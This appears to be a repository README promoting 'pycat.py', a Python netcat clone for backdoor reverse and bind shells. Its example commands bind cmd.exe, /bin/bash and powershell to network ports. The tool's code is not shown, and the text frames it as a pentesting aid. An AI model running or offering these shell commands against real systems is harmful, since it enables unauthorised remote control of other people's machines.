## The best python backdoor shell in the world.

We can absolutely sure this is the best PYTHON SHELL in the 
world until now. You try it now.

Python netcat for reverse or bind shell. Py-shell is a custom 
network tool to create backdoor shell (pentesting) and some 
other network purpose like connection testing or remote command 
excution (for who want to help others remotely).

Usage:

**python3 pycat.py -l -p [PORT] -e [FILENAME]**

**python3 pycat.py -t [ADDRESS] -p [PORT] -e [FILENAME]**

****
Example usage:


*python3 pycat.py -l -p 4444*

*python3 pycat.py -t 127.0.0.1 -p 4444*

*python3 pycat.py -l  -p 8080 -e cmd.exe*

*python3 pycat.py -t 127.0.0.1 -p 8080 -e /bin/bash*

*python3 pycat.py -l -p 5000 -e powershell*



Created by toidihack(hacking at HackerOne and Bugcrowd)
 
